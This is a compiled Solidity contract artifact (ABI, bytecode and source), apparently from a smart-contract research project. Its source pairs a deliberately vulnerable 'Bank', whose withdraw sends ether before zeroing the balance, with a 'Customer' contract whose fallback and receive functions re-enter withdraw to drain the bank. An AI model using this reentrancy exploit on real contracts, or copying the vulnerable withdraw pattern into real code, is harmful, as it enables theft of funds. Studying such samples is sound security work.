{
  "contractName": "Customer",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_etherStoreAddress",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "counter",
          "type": "uint256"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "inputs": [],
      "name": "etherStore",
      "outputs": [
        {
          "internalType": "contract Bank",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    },
    {
      "inputs": [],
      "name": "simulate",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040526000805534801561001457600080fd5b5060405161072c38038061072c83398181016040528101906100369190610117565b81600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505050610157565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100ae82610083565b9050919050565b6100be816100a3565b81146100c957600080fd5b50565b6000815190506100db816100b5565b92915050565b6000819050919050565b6100f4816100e1565b81146100ff57600080fd5b50565b600081519050610111816100eb565b92915050565b6000806040838503121561012e5761012d61007e565b5b600061013c858286016100cc565b925050602061014d85828601610102565b9150509250929050565b6105c6806101666000396000f3fe60806040526004361061002d5760003560e01c8063acd2e6e5146101fe578063c06785c61461022957610118565b3661011857670de0b6b3a7640000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16311061011657600160008082825461008c91906103f9565b92505081905550600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100fd57600080fd5b505af1158015610111573d6000803e3d6000fd5b505050505b005b670de0b6b3a7640000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106101fc57600160008082825461017291906103f9565b92505081905550600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156101e357600080fd5b505af11580156101f7573d6000803e3d6000fd5b505050505b005b34801561020a57600080fd5b50610213610233565b60405161022091906104ce565b60405180910390f35b610231610259565b005b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b670de0b6b3a76400003410156102a4576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161029b90610546565b60405180910390fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663b6b55f25670de0b6b3a76400006000546040518363ffffffff1660e01b815260040161030a9190610575565b6000604051808303818588803b15801561032357600080fd5b505af1158015610337573d6000803e3d6000fd5b5050505050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156103a657600080fd5b505af11580156103ba573d6000803e3d6000fd5b50505050565b6000819050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000610404826103c0565b915061040f836103c0565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff03821115610444576104436103ca565b5b828201905092915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061049461048f61048a8461044f565b61046f565b61044f565b9050919050565b60006104a682610479565b9050919050565b60006104b88261049b565b9050919050565b6104c8816104ad565b82525050565b60006020820190506104e360008301846104bf565b92915050565b600082825260208201905092915050565b7f4d6f7265207468616e2031206574686572206e65656465640000000000000000600082015250565b60006105306018836104e9565b915061053b826104fa565b602082019050919050565b6000602082019050818103600083015261055f81610523565b9050919050565b61056f816103c0565b82525050565b600060208201905061058a6000830184610566565b9291505056fea2646970667358221220dbaa91ede6b836251380f4cb40ed71bf949ebe6d8e313c38d1d1f799e18d678364736f6c63430008090033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: GPL-3.0\npragma solidity >=0.4.2 <0.9.0;\n\ncontract Bank {\n    // A vulnerable bank smart contract.\n    mapping (address => uint256) balances;\n    \n    // This gives the amount/ether strored in the smart contract.\n    function deposit(uint256 index) public payable {\n        // Consumes a lot of gas.\n        // May fail the deposit call()\n        uint256 counter = index;\n        while (counter > 0) \n            counter -= 1;\n            \n        (bool sent, bytes memory data) = payable(address(this))\n                                    .call{value:msg.value}(\"\");\n        balances[msg.sender] += msg.value;\n    }\n    \n    // web3.utils.toWei('1', 'ether') else goes to fallback since\n    // arguments error.\n    function withdraw()\n        public\n        payable\n    {\n        (bool sent, bytes memory data) = msg.sender\n                           .call{value:balances[msg.sender]}(\"\");\n        require(sent, \"Failed to send Ether\");\n        balances[msg.sender] = 0;\n    }\n}\n\n\ncontract Customer {\n    uint256 counter = 0;\n    Bank public etherStore;\n\n    constructor(address _etherStoreAddress, uint256 counter) {\n        etherStore = Bank(_etherStoreAddress);\n        counter = counter;\n    }\n    \n        // Fallback is called when EtherStore sends Ether to this contract.\n    fallback() external payable {\n        if (address(etherStore).balance >= 1 ether) {\n            counter +=  1;\n            etherStore.withdraw();\n        }\n    }\n\n    // Fallback is called when EtherStore sends Ether to this contract.\n    receive() external payable {\n        if (address(etherStore).balance >= 1 ether) {\n            counter +=  1;\n            etherStore.withdraw();\n        }\n    }\n    \n    function simulate() external payable {\n        require(msg.value >= 1 ether, \"More than 1 ether needed\");\n        etherStore.deposit{value: 1 ether}(counter);\n        etherStore.withdraw();\n    }\n}",
  "sourcePath": "/home/clustfuzz/Documents/Research/Smart Contracts Project/Solidity-Examples/contract-samples/contracts/Example.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.9+commit.e5eed63a.Emscripten.clang"
  },
  "schemaVersion": "3.4.4",
  "updatedAt": "2022-01-31T06:06:31.028Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}